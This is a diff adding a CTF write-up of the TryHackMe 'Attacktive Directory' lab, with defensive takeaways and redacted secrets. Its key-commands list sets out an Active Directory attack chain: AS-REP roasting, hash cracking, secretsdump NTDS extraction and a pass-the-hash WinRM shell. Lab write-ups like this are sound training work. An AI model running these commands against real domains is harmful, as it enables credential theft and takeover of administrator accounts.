@@ -1,0 +1,42 @@
+Attacktive Directory — Technical CTF Documentation
+
+This plain-text .doc file mirrors the portfolio documentation for environments that require a Word-compatible document. For the full Markdown version, see Documentation/Attacktive_Directory_documentation.md.
+
+Platform: TryHackMe
+Lab: Attacktive Directory
+Target: 10.64.145.19
+Domain: spookysec.local
+
+SUMMARY
+The lab demonstrated an Active Directory attack chain beginning with Nmap reconnaissance, followed by domain and user enumeration, AS-REP roasting, offline credential recovery, SMB share enumeration, backup credential discovery, directory replication abuse, NTDS extraction, and pass-the-hash to an Administrator WinRM shell.
+
+PUBLICATION HYGIENE
+Flag values, recovered passwords, and reusable NTLM material are redacted from the portfolio version.
+
+ATTACK CHAIN
+Recon → Domain Discovery → Kerberos Enumeration → AS-REP Roasting → Offline Recovery → SMB → Backup Credential → Replication Abuse → NTDS Extraction → Pass-the-Hash → Administrator Access
+
+KEY COMMANDS
+nmap -Pn -A -p- -T4 10.64.145.19
+crackmapexec smb 10.64.145.19
+kerbrute userenum -d spookysec.local --dc 10.64.145.19 users.txt
+python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.64.145.19 -usersfile valid_users.txt -request
+hashcat -m 18200 Hash.txt passwords.txt
+netexec smb 10.64.145.19 -u 'svc-admin' -p '<REDACTED>' --shares
+smbclient //10.64.145.19/backup -U 'svc-admin'
+secretsdump.py spookysec.local/backup:<REDACTED>@10.64.145.19
+evil-winrm -i 10.64.145.19 -u 'Administrator' -H '<REDACTED_NTLM_HASH>'
+
+DEFENSIVE TAKEAWAYS
+1. Enforce Kerberos preauthentication where appropriate.
+2. Remove credential artifacts from readable shares.
+3. Audit directory replication permissions.
+4. Minimize NTLM exposure and monitor pass-the-hash indicators.
+5. Correlate Kerberos, SMB, replication and WinRM telemetry.
+
+FLAG LOCATIONS
+svc-admin: C:\Users\svc-admin\Desktop\user.txt.txt
+backup: C:\Users\backup\Desktop\PrivEsc.txt
+Administrator: C:\Users\Administrator\Desktop\root.txt
+
+Values: [REDACTED]
